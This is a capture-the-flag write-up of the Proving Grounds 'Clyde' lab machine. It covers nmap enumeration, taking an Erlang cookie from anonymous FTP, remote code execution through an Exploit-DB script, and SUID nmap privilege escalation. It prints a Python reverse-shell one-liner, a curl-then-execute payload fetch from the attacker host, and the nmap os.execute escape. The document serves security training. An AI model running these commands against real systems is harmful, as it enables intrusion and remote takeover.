---
layout: post
title: Proving Grounds - Clyde (Hard)
---

# Introduction 

This is a Hard Linux box on Proving Grounds.

# Enumeration

Immediately when we begin to enumerate this box we can see a massive amount of data is available to us on an FTP server. It looks like the `/bin/` directory is being served over FTP.

```bash
$ sudo nmap --min-rate 100 -sV -sC -T4  192.168.216.68 -oA nmap/versions                              
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-26 12:13 EDT
Stats: 0:00:26 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 12:14 (0:00:08 remaining)
Nmap scan report for ip-192-168-216-68.eu-west-1.compute.internal (192.168.216.68)
Host is up (0.022s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT      STATE  SERVICE VERSION
21/tcp    open   ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Apr 24  2020 PackageKit
| drwxr-xr-x    5 ftp      ftp          4096 Apr 24  2020 apache2
| drwxr-xr-x    5 ftp      ftp          4096 Sep 21  2020 apt
| drwxr-xr-x    2 ftp      ftp          4096 Apr 22  2020 dbus
| drwxr-xr-x    2 ftp      ftp          4096 Apr 24  2020 dhcp
| drwxr-xr-x    7 ftp      ftp          4096 Sep 21  2020 dpkg
| drwxr-xr-x    2 ftp      ftp          4096 Apr 20  2020 git
| drwxr-xr-x    2 ftp      ftp          4096 Apr 24  2020 initramfs-tools
| drwxr-xr-x    2 ftp      ftp          4096 May 07  2020 logrotate
| drwxr-xr-x    2 ftp      ftp          4096 Sep 08  2019 misc
| drwxr-xr-x    5 ftp      ftp          4096 Feb 15 10:01 mysql
| drwxr-xr-x    2 ftp      ftp          4096 Jul 13  2017 os-prober
| drwxr-xr-x    2 ftp      ftp          4096 Apr 24  2020 pam
| drwxr-xr-x    4 ftp      ftp          4096 Apr 24  2020 php
| drwx------    3 ftp      ftp          4096 Apr 24  2020 polkit-1
| drwxr-xr-x    2 ftp      ftp          4096 Apr 24  2020 python
| drwxr-xr-x    3 ftp      ftp          4096 May 08  2020 rabbitmq
| drwxr-xr-x    2 ftp      ftp          4096 Apr 24  2020 sgml-base
| drwxr-xr-x    6 ftp      ftp          4096 Apr 22  2020 systemd
| drwxr-xr-x    3 ftp      ftp          4096 Apr 30  2020 ucf
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.49.216
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 df:63:99:a4:cf:79:00:c8:b1:d6:67:97:81:4d:4f:af (RSA)
|   256 bd:9b:35:41:34:a2:5a:4c:fa:1b:9f:f1:36:f3:6a:fd (ECDSA)
|_  256 db:96:ee:8d:29:2b:f4:a3:58:b2:fb:c1:ac:65:92:48 (ED25519)
53/tcp    closed domain
80/tcp    open   http    Apache httpd 2.4.25 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.25 (Debian)
65000/tcp open   unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 146.24 seconds
```

Running a further Nmap scan over the full port range we see the RabbitMQ service is running, alongside the Erlang Port Mapper Daemon. On port 15672 the management portal for RabbitMQ is available.

```bash
$ sudo nmap --min-rate 100 -p- -T4  192.168.216.68 -oA nmap/all  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-26 12:14 EDT
Nmap scan report for ip-192-168-216-68.eu-west-1.compute.internal (192.168.216.68)
Host is up (0.023s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE  SERVICE
21/tcp    open   ftp
22/tcp    open   ssh
53/tcp    closed domain
80/tcp    open   http
4369/tcp  open   epmd
15672/tcp open   unknown
65000/tcp open   unknown

PORT      STATE  SERVICE    VERSION
4369/tcp  open   epmd       Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 65000
15672/tcp open   http       Cowboy httpd
|_http-title: RabbitMQ Management
|_http-server-header: Cowboy

```

## Webserver

As mentioned on port 15672 we have RabbitMQ.

![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220426121946.png)

Trying default creds `guest:guest` unfortunately does not work (worth a try!).

![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220426122049.png)

Since we have anonymous FTP access, we can try pulling the `rabbitmq` directory there to search for any config files. These may contain credentials.

```bash
wget -r ftp://anonymous@192.168.216.68/rabbitmq
```

Searching the strings of rabbitmq data files, I found some possible users `seth` and `clyde`. But bruteforcing is not possible as it appears there is an account lock out feature.

After searching for a long time I found an erlang cookie in the rabbitmq directory (always remember to check for hidden files!)

```bash
┌──(kali㉿pm-kali)-[~/…/provingGrounds/clyde/192.168.216.68/rabbitmq]
└─$ ls -la             
total 16
drwxr-xr-x  3 kali kali 4096 Apr 26 12:23 .
drwxr-xr-x 13 kali kali 4096 Apr 26 12:47 ..
-rw-r--r--  1 kali kali   20 Apr 24  2020 .erlang.cookie
drwxr-xr-x  6 kali kali 4096 Apr 26 12:24 mnesia
                                                                                                                          
┌──(kali㉿pm-kali)-[~/…/provingGrounds/clyde/192.168.216.68/rabbitmq]
└─$ cat .erlang.cookie 
JPCGJCAEWHPKKPBXBYYB
```

This can be used to gain RCE via Erlang Port Mapper Daemon. A Python exploit exists for this - [49418 - Erlang Cookie - Remote Code Execution](https://www.exploit-db.com/exploits/49418)

# Initial Access

> Erlang allows distributed Erlang instances to connect and remotely execute commands.
> Nodes are permitted to connect to eachother if they share an authentication cookie,
> this cookie is commonly called ".erlang.cookie"

```python
TARGET = "192.168.216.68"
PORT = 65000
COOKIE = "JPCGJCAEWHPKKPBXBYYB"
```

![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220426132539.png)


This was awkward to get a reverse shell. Had to put a Python revshell for port 21 in a bash script - curl chmod execute, separately.

```bash
$ cat test2.sh                        
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.216",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Sending `curl` first:

```python
TARGET = "192.168.216.68"
PORT = 65000
COOKIE = "JPCGJCAEWHPKKPBXBYYB"
CMD = "curl http://192.168.49.216/test2.sh -o test2.sh"
```

Changing mode and executing separately:

```python
TARGET = "192.168.216.68"
PORT = 65000
COOKIE = "JPCGJCAEWHPKKPBXBYYB"
CMD = "chmod +x test2.sh; ./test2.sh"
```

![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220426134224.png)

Alternately we could've sent the reverse shell on its own and escaped the quotes e.g.

```bash
CMD = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.118.6\",15672));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
```

# Privilege Escalation

Nmap has a SUID bit set but there is no `sudo` on this box...

Looked around a lot but tried the Limited SUID technique to GTFObins and it does vaguely work. Through this we could probably spawn a full reverse shell. But this is enough to grab the root hash.

```bash
echo 'os.execute("/bin/sh")' > test 
nmap --script=test
```

![]({{site.baseurl}}/assets/resources/Pasted%20image%2020230119000719.png)
